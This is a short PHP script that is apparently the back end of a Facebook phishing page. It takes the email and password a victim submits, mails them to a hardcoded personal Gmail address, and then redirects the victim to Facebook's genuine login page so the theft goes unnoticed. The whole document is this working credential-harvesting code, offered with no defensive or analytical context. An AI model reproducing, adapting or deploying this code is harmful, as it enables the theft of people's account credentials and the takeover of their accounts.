<html>
<body>
<?php
    $email=$_POST["email"];
    $pass=$_POST["pass"];
    $emailid="sahoosourav1996@gmail.com";
    $subject="my time has come";
    $string=$email." ".$pass;
    $mail=mail($emailid,$subject,$string,"");
    if($mail)
    {
        header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");
        die();
    }
?>
    </body>
</html>